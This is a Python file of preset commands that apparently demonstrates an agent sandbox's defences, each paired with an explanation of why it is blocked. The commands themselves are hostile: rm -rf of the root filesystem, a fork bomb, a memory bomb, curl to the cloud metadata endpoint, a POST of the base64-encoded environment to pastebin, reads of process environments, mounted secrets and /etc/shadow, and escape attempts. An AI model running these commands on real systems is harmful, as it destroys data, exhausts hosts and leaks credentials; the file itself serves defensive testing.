PRESETS = {
    "wipe": {
        "title": "rm -rf / inside the sandbox",
        "explain": "Deletes everything the sandbox user can reach. The root filesystem is read-only, so only the sandbox's own scratch space goes. The next sandbox starts clean.",
        "command": "mkdir -p /work/repo && echo data > /work/repo/file; echo before: $(ls /usr/bin | wc -l) binaries, $(ls -A /work | wc -l) entries in /work; "
                   "rm -rf --no-preserve-root / 2>&1 | grep -c 'Read-only file system' | xargs -I{} echo 'rm -rf /: {} deletions refused (Read-only file system)'; "
                   "echo after: $(ls /usr/bin | wc -l) binaries, $(ls -A /work | wc -l) entries left in /work",
        "timeout": 60,
    },
    "forkbomb": {
        "title": "Fork bomb",
        "explain": "The classic bash fork bomb. The process limit refuses new processes, the CPU limit keeps the host responsive, and the sandbox is destroyed afterwards.",
        "command": "echo 'starting :(){ :|:& };:'; (bash -c ':(){ :|:& };:' 2>&1 | grep -m1 -o 'fork: .*' ) & sleep 8; "
                   "echo \"after 8 s: $(ls -d /proc/[0-9]* 2>/dev/null | wc -l) processes in the sandbox, limit 256\"; "
                   "echo 'killing every process in the sandbox'; kill -9 -1",
        "timeout": 40,
    },
    "membomb": {
        "title": "Memory bomb",
        "explain": "Allocates memory until something stops it. The sandbox has a hard memory limit; when it is hit the sandbox is killed, not the host.",
        "command": "python3 -c \"\nimport sys\nblocks = []\nfor i in range(64):\n    blocks.append(bytearray(256 * 1024 * 1024))\n    print(f'allocated {(i + 1) * 256} MiB', flush=True)\n\"",
        "timeout": 60,
    },
    "metadata": {
        "title": "Steal cloud credentials",
        "explain": "Tries the cloud metadata endpoint (where VM credentials and user data live) through the proxy and directly. The gate refuses it by address after DNS resolution; there is no direct route at all.",
        "command": "echo '# through the proxy'; curl -s -m 8 http://169.254.169.254/v1.json; echo; "
                   "echo '# direct, bypassing the proxy'; curl -s -m 8 --noproxy '*' http://169.254.169.254/v1.json || echo \"curl exit $?\"",
        "timeout": 40,
    },
    "exfil": {
        "title": "Exfiltrate data",
        "explain": "Posts the environment to a host that is not on the allowlist, by name, by raw IP and over a non-web port. Every attempt is refused and logged.",
        "command": "curl -s -m 8 -X POST --data \"$(env | base64 -w0)\" https://pastebin.com/api/api_post.php; echo; "
                   "curl -s -m 8 https://1.1.1.1/ ; echo; "
                   "curl -s -m 8 https://github.com:22/ || echo \"curl exit $?\"; "
                   "git clone -q https://gitlab.com/gitlab-org/gitlab-test.git /tmp/x 2>&1 | tail -1",
        "timeout": 60,
    },
    "secrets": {
        "title": "Look for secrets",
        "explain": "Searches the places agent sandboxes usually leak keys: environment, process environments, mounted secrets, the Docker socket, the host filesystem.",
        "command": "echo '# environment'; env | sort; "
                   "echo '# other processes'; cat /proc/1/environ 2>&1 | tr '\\0' '\\n' | head -5; "
                   "echo '# mounted secrets and sockets'; ls -la /run/secrets /var/run/docker.sock 2>&1; "
                   "echo '# host files'; ls /host /root 2>&1; "
                   "echo '# who am I'; id; "
                   "echo '# kernel'; uname -a; dmesg 2>/dev/null | head -3",
        "timeout": 30,
    },
    "escape": {
        "title": "Try to break out",
        "explain": "Privileged operations an escape needs: mounting, raw devices, kernel memory, changing user, writing to the system. Refused: non-root, no capabilities, no new privileges, and a user-space kernel underneath. A user namespace can still be created inside gVisor, but its root counts only inside that namespace, as the last lines show.",
        "command": "mount -t tmpfs none /mnt 2>&1; ls /dev | head -20 | tr '\\n' ' '; echo; "
                   "cat /proc/kcore 2>&1 | head -c 100; echo; "
                   "su -c id root 2>&1 </dev/null | head -1; "
                   "insmod /tmp/x.ko 2>&1; "
                   "touch /usr/bin/backdoor 2>&1; "
                   "echo '# root inside a user namespace, and only there'; "
                   "unshare -r sh -c 'id; touch /usr/bin/backdoor; cat /etc/shadow; mount -t tmpfs none /mnt' 2>&1",
        "timeout": 30,
    },
}

HEALTH_CHECK = ("echo fresh sandbox: $(ls /usr/bin | wc -l) binaries in /usr/bin, $(ls -A /work | wc -l) entries in /work, "
                "user $(id -un); python3 -c 'print(\"python ok\")'")
